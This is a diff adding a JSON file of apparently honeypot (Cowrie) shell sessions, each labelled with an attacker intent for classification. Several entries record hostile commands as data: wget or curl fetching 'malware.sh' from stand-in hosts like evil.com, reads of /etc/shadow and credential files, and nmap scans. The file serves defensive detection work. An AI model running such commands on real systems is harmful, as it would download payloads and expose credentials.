@@ -1,0 +1,1108 @@
+[
+  {
+    "session_summary": "ls; wget http://evil.com/malware.sh; sudo su; cat /etc/shadow; sleep 5; ls; uname -r",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "a9646ed3d97e",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls; sudo su; cat /etc/shadow; sleep 5; ls; uname -r",
+    "intent": "credential_access",
+    "full_details": {
+      "session_id": "be4c65b86df8",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls sudo su whoami pwd cat etc/shadow cat /etc/shadow ls cat .db_creds",
+    "intent": "credential_access",
+    "full_details": {
+      "session_id": "16c2f697f636",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 8
+    }
+  },
+  {
+    "session_summary": "ls mysql whomai whoami pwd df -h ls cat .db_creds netstat -tuln uname -r ifconfig env",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "6c80537d5b4a",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 12
+    }
+  },
+  {
+    "session_summary": "la ls ls ls ls sudo ls sudo ls sudo ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "7c4475c7304b",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "ls uname df -h pwd whoami ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "aabf86a0f7cd",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "pwd ls whoami uname -a wget http://malicious-site.com/exploit.sh wget http://example.com/malware.sh ls exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "3e0bbfbe55da",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 8
+    }
+  },
+  {
+    "session_summary": "pwd ls whoami uname -a wget http://x ls ls lsls ls exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "ea3a2a21aaec",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 10
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls l ls pwd whoami sudo sudo -su ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "cac5491cc4ab",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 12
+    }
+  },
+  {
+    "session_summary": "pwd whoami ls ls sudo ls sudo la sudo ls sudo ls sudo ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "fdf4d004c2c0",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 10
+    }
+  },
+  {
+    "session_summary": "pwd whoami ls ls sudo ls sudo ls sudo ls cat /etc/passwd cat /etc/passwd touch test.txt touch test2.txt",
+    "intent": "credential_access",
+    "full_details": {
+      "session_id": "5ea436d188f7",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 11
+    }
+  },
+  {
+    "session_summary": "pwd whoami ls time ls ls sudo ls sudo la sudo ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "21500d39f5d2",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "pwd whoami ls time ls sudo ls sudo ls sudo ls cat /etc/passwd cat /etc/passwd touch test.txt touch test2.txt ps",
+    "intent": "credential_access",
+    "full_details": {
+      "session_id": "529cc29b6696",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 12
+    }
+  },
+  {
+    "session_summary": "ls pwd whoami ls sudo ls sudo  exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "546e01f0ea83",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls sudo ls sudo ls sudo ls touch file1.txt touch file2.txt wget http://google.com -O file1 exeit exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "ca3df8c810a6",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 12
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls sudo ls sudo ls sudo ls touch file1.txt ls touch file2.txt wget http://google.com -O file1 wget http://google.com -O file2 ls -l file1 file2 exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "b4e6fb066923",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 14
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls sudo ls touch file1.txt touch file2.txt wget http://google.com -O file1 exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "7c53d900a7ae",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "363e13d6605d",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "5eb57580c000",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "18ef2ae20568",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "00fae9222fe0",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "8918c33cb077",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "98b823c41223",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd uname df ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "4cba46d64dca",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls ls ls lsls ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "6fffcfb24c60",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 5
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls l ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "7b74aee15b28",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 6
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "1c627411e79a",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 6
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls sudo ls sudo ls sudo ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "6a7674e34a6f",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 8
+    }
+  },
+  {
+    "session_summary": "ls ls sudo ls ls sudo ls sudo ls wget http://x",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "5823d1253484",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "wget http://evil.com/a.sh",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "58449118174f",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls sudo s ls ls sudo ls sudo wget http://evil.com/a.sh wget http://evil.com/a.sh exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "123cc4e0bfbd",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "3b97be7a8e68",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh wget http://evil.com/a.sh",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "f55ad6156a9b",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "apt-get install nmap apt-get install curl apt-get install curl apt-get install wget apt-get install curl exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "58e762924e03",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 6
+    }
+  },
+  {
+    "session_summary": "bash bash bash bash bash bash exit bash exit exit exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "9743e85b66c3",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 11
+    }
+  },
+  {
+    "session_summary": "ls ls cat README.txt ls cat .db_creds cat .db_creds cat .db_creds ls cat passwords.txt cat passwords.txt cat passwords.txt cat passwords.txt cat passwords.txt cat passwords.txt cat passwords.txt cat passwords.txt cat passwords.txt cat passwords.txt cat passwords.txt cat passwords.txt exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "fc59f5c79e90",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 21
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls ls cat .db_creds cat .db_creds cat .db_creds cat .db_creds cat .db_creds cat README.txt",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "29c0c2c21ac5",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 11
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls sudo ls sudo ls sudo ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "0caa1dc68e82",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "wget http://example.com?malware.sh wget http://example.com wget http://example.com apt-get install nmap apt-get install curl apt-get install wget apt-get install htop",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "ca248a07eced",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "bash bash bash ls ls ls ls ls cat README.txt exit exit exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "b465db7e26f0",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 12
+    }
+  },
+  {
+    "session_summary": "pwd ls whoami uname -a wget http://malicious-site.com/exploit.sh exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "d05a7cfb7278",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 6
+    }
+  },
+  {
+    "session_summary": "ls mysql whoami pwd ls mysql df -h ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "9d65c3187bc0",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "ls mysql whoami pwd uname -a ls mysql ls nmap ls df -h ls cat /bin/ ls ls ls ls ls mysql mysql mysql ls exit",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "c240731dea12",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 23
+    }
+  },
+  {
+    "session_summary": "ls mysql df -h whoami pwd ls sudo mysql ls myssql mysql exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "c58c74c80da3",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 12
+    }
+  },
+  {
+    "session_summary": "ls mysql exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "b76cbb5947ca",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 3
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls ls ls ls sl sls s;ls slexit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "4ea7aed884cf",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 11
+    }
+  },
+  {
+    "session_summary": "ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "42fabf217981",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 2
+    }
+  },
+  {
+    "session_summary": "s s s s s s s s ssexit exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "aefb13c48665",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 10
+    }
+  },
+  {
+    "session_summary": "exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "18764c157e59",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls mysql whoami pwd df -h ls uname ls ls mysql nmap ls ls ls -a ls ls ls ls mysql ls whoami ls ks ls exit",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "b452708b687b",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 25
+    }
+  },
+  {
+    "session_summary": "ls mysql whoami pwd ls ls mysql uname mysql show databases mysql show databases; ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "370fb9d2ffa1",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 14
+    }
+  },
+  {
+    "session_summary": "ls mysql whoami pwd df -h ls wget http://x mysql show databases; exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "51326a82fd3c",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 10
+    }
+  },
+  {
+    "session_summary": "ls mysql df -h whoami pwd ls mysql",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "c7a6f4c325dd",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls mysql whoami pwd df -h ls mysql",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "7f4624c92043",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls whoami",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "90a26956e914",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 2
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "092e38c3c85e",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 4
+    }
+  },
+  {
+    "session_summary": "wget http://malicious-site.com/exploit.sh uname -a ifconfig ls exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "513052891fd0",
+      "files_accessed": [
+        "var/lib/cowrie/downloads/7e3d2033596a6c205f30c0533eaa734717590750987f02d2c862c1b0d9eeea7b"
+      ],
+      "urls": [
+        "http://malicious-site.com/exploit.sh"
+      ],
+      "command_count": 5
+    }
+  },
+  {
+    "session_summary": "ls uname -a whoami pwd df -h ls ls ls ls -a sudo ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "269a34007676",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 12
+    }
+  },
+  {
+    "session_summary": "uname -r; sudo id; su",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "4841c1419f69",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "uname -r; sudo id; su; echo \"password\"; chmod +x README.txt; ls -l README.txt; curl http://example.com/malware",
+    "intent": "dropper_execution",
+    "full_details": {
+      "session_id": "cd95d64cff7c",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd df -h ls ls ls cat exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "08626b443289",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "uname -r",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "3cf8153ccfe8",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "uname -r",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "86dce1788eb7",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "uname -r; sudo id; wget http://evil.com/malware.sh; uname -r",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "0ff9e600f946",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "uname -r",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "91a05919df48",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "uname -r",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "14a61b6bc718",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "uname -r; wget http://evil.com/malware.sh; sudo su; cat /etc/shadow; uname -r",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "edd587e7011c",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd df -h ls wget http://example.sh ls exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "be1c82c3f855",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 8
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls ls -a whoami mysql mysql exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "e7b6c6953e1b",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "7fe49deeb2ba",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 2
+    }
+  },
+  {
+    "session_summary": "ped pwd ls -a whoami cd .ssh ls exit",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "557b4cdc471e",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls pwd whoami ls-a ls -a ls cd .ssh ls exit",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "b339a9bdecd3",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "ls pwd whoami cd .ssh ls exit",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "7afd88aa7283",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 6
+    }
+  },
+  {
+    "session_summary": "ls ls ls lsl exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "64272737caa1",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 5
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls whoami pwd ls -la s ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "21a058f45d25",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 10
+    }
+  },
+  {
+    "session_summary": "ls cd / ls cd /bin ls cd /etc ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "b73782b51072",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 8
+    }
+  },
+  {
+    "session_summary": "ls cd / ls cd /bin ls cd /etc ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "0cd3a6717b54",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 8
+    }
+  },
+  {
+    "session_summary": "ls cd / ls cd /bin ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "e4688bb3d9b2",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 6
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls ls ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "891555b4ef3d",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls ls ls sls ls s s exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "7f4db1fa4116",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 11
+    }
+  },
+  {
+    "session_summary": "ls ls ls whoami pwd df -h ls mysql nmap mysql ls exit",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "97e5c878f609",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 12
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls ls ls ls whoami whoami mysql mysql pwd pwd exit exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "a3f74d6a92a7",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 15
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls l ls  exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "473581407b28",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls ls ls mysql whoami pwd ls ls ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "23f399cad609",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 13
+    }
+  },
+  {
+    "session_summary": "ls ls ls ls ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "297536243060",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 6
+    }
+  },
+  {
+    "session_summary": "ls ls lsls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "d7d3d961358d",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 3
+    }
+  },
+  {
+    "session_summary": "ls whoami whoami ls ks mysql mysql nmap df- h ls ls -a ls -la whoami pwd mysql mysql ls ls l ls cat /etc/passwd ls mysql exit",
+    "intent": "credential_access",
+    "full_details": {
+      "session_id": "7df54c9610a3",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 24
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd mysql nmap ls whoami mysql df -h ls -la sudo su wget http://example.com/malware.sh mysql ls ls ls ls mysql mysql exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "f88985df16ab",
+      "files_accessed": [
+        "var/lib/cowrie/downloads/6f5635035f36ad500b4fc4bb7816bb72ef5594e1bcae44fa074c5e988fc4c0fe"
+      ],
+      "urls": [
+        "http://example.com/malware.sh"
+      ],
+      "command_count": 20
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd df -h ls whoami df -h mysql nmap mysql nmap 127.0.0.1 cat etc/[asswd ls mysql nmap 127.0.0.1 wget wget malware.sh wget /malware.sh wget http://example.com/malware.sh mysql sudo su mysql exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "e56abe250837",
+      "files_accessed": [
+        "var/lib/cowrie/downloads/6f5635035f36ad500b4fc4bb7816bb72ef5594e1bcae44fa074c5e988fc4c0fe"
+      ],
+      "urls": [
+        "http://example.com/malware.sh"
+      ],
+      "command_count": 23
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd mysql ls df -h ls -la ls mysql nmap mysql uname uname -a mysql mysql mysql exit",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "0ef310f5d92b",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 17
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd ls mysql nmap 127.0.0.1 exit",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "5c1e2ce056ca",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls ls whoami ls pwd ls mysql nmap df -h ls mysql cat etc/passwd mysql nmap 127.0.0.1 wget http://malware.sh exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "42ae1299e35d",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 16
+    }
+  },
+  {
+    "session_summary": "ls ls whoami pwd ls whoami pwd ls -a ls ls -la",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "326485408631",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 10
+    }
+  },
+  {
+    "session_summary": "ls ls whoami pwd ls ls -a ls -la",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "1212145bc929",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls ls ls whoami pwd ls mysql nmap df -h mysql ls nmap mysql sudo sudo su cd /bin ls cd .. ls unma uname uname -a ls nmap 127.0.0.1 exit",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "a93e725969d0",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 25
+    }
+  },
+  {
+    "session_summary": "ls ls whoami pwd ls mysql ls pwd whoami ls ls ls ls ls ls",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "1b8a3b1b7cf6",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 15
+    }
+  },
+  {
+    "session_summary": "ls ls whoami ls ls pwd mysql ls ls ls ls ls ls -a exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "6ca5d9f59632",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 14
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd ls mysql ls ls ls ls -a nmap ls ls lsl",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "ddbf67bab2f6",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 13
+    }
+  },
+  {
+    "session_summary": "ls ls mysql df -h ls ls ls nmap mysql wget mysql exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "7ea629421fc1",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 12
+    }
+  },
+  {
+    "session_summary": "ls ls whoami pwd ls mysql ls nmap sudo ls mysql unmae uname mysql nmap nmap 127.0.0.1 ls -a ls nmap 127.0.0.1 wget http://example.com/malware.sh nmap 127.0.0.1 nmap -p  127.0.0.1 mysql show databases exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "f19bc1a3cd98",
+      "files_accessed": [
+        "var/lib/cowrie/downloads/6f5635035f36ad500b4fc4bb7816bb72ef5594e1bcae44fa074c5e988fc4c0fe"
+      ],
+      "urls": [
+        "http://example.com/malware.sh"
+      ],
+      "command_count": 25
+    }
+  },
+  {
+    "session_summary": "ls mysql nmap ls whoami pwd ls mysql ls nmap sudo su ls ls -a uname -a ls ls ls mysql wget ls ls exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "82b9d79d5b7d",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 22
+    }
+  },
+  {
+    "session_summary": "ls mysql wget whoami pwd ls mysql ls mysql exit",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "a068d158480d",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 10
+    }
+  },
+  {
+    "session_summary": "nmap -sS 192.168.1.1",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "test_verif_1766514332",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "nmap -sS 192.168.1.1",
+    "intent": "lateral_movement",
+    "full_details": {
+      "session_id": "test_verif_1766514392",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 1
+    }
+  },
+  {
+    "session_summary": "ls mysql -u root",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "test_full_1766514686",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 2
+    }
+  },
+  {
+    "session_summary": "lss ls whoami pwd df -h ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "b2ec276d41c9",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 7
+    }
+  },
+  {
+    "session_summary": "ls whoami pwd df -h uname ls ls ls exit",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "2f28ba5056cb",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 9
+    }
+  },
+  {
+    "session_summary": "ls pwd whoami",
+    "intent": "reconnaissance",
+    "full_details": {
+      "session_id": "session-normal-101",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 3
+    }
+  },
+  {
+    "session_summary": "uname -a sudo su - wget http://hacker/malware.sh",
+    "intent": "payload_delivery",
+    "full_details": {
+      "session_id": "session-malicious-202",
+      "files_accessed": [],
+      "urls": [],
+      "command_count": 3
+    }
+  }
+]
